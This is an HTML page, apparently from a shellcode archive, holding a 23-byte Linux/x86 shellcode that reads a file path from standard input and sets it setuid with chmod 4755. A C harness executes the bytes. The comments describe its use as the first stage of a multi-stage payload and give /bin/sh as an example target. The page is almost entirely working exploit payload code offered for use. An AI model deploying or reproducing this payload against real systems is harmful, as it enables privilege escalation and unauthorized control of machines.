<html><head><title>Linux/x86 - read(0,buf,2541); chmod(buf,4755); - 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* readnchmod-core.c by Charles Stevenson &lt;core@bokeoa.com&gt; 
 *
 * Example of strace output if you pass in &quot;/bin/sh\x00&quot;
 * read(0, &quot;/bin/sh\0&quot;, 2541)              = 8
 * chmod(&quot;/bin/sh&quot;, 04755)                 = 0
 *
 * Any file path can be given.  For example: /tmp/.sneakyguy
 * The only caveat is that the string must be NULL terminated.
 * This shouldn't be a problem.  For multi-stage payloads send
 * in this first and then you can send it data with null bytes.
 * I made this for rare cases with tight space contraints and
 * where read() jmp *%esp is not practical.
 *
 */
char hellcode[] = /* read(0,buf,2541); chmod(buf,4755); linux/x86 by core */
&quot;\x31\xdb&quot;//               xor    %ebx,%ebx
&quot;\xf7\xe3&quot;//               mul    %ebx
&quot;\x53&quot;//                   push   %ebx
&quot;\xb6\x09&quot;//               mov    $0x9,%dh
&quot;\xb2\xed&quot;//               mov    $0xed,%dl
&quot;\x89\xe1&quot;//               mov    %esp,%ecx
&quot;\xb0\x03&quot;//               mov    $0x3,%al
&quot;\xcd\x80&quot;//               int    $0x80
&quot;\x89\xd1&quot;//               mov    %edx,%ecx
&quot;\x89\xe3&quot;//               mov    %esp,%ebx
&quot;\xb0\x0f&quot;//               mov    $0xf,%al
&quot;\xcd\x80&quot;//               int    $0x80
;

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte read(0,buf,2541); chmod(buf,4755); linux/x86 by core\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
